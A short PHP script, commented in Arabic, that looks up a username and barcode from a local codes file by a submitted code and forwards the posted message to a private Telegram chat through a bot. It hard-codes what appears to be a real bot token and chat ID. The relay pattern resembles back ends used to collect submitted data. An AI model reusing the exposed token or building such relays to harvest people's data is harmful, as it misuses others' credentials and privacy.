<?php
$botToken = "7797226511:AAGoxMmopLJtj4Q5vPEm9LlWMdlXpE-9umQ";
$chatId = "1517619890";
$data = json_decode(file_get_contents('php://input'), true);
$message = $data["message"];
$user_code = isset($data["user_code"]) ? $data["user_code"] : "";

$username = "";
$barcode = "";

if ($user_code && file_exists("codes.txt")) {
    foreach(file("codes.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line){
        $parts = explode("|", $line);
        if(isset($parts[2]) && $parts[2] == $user_code) {
            $username = $parts[0];
            $barcode  = $parts[1];
            break;
        }
    }
}

// إضافة اسم المستخدم والباركود أعلى الرسالة
if ($username || $barcode) {
    $top = "";
    if ($username) $top .= "👤 اسم المستخدم: $username\n";
    if ($barcode)  $top .= "🏷️ الباركود: $barcode\n";
    $message = $top . $message;
}

$url = "https://api.telegram.org/bot$botToken/sendMessage";
$post_fields = array(
    'chat_id' => $chatId,
    'text' => $message
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
$output = curl_exec($ch);
echo $output;
?>
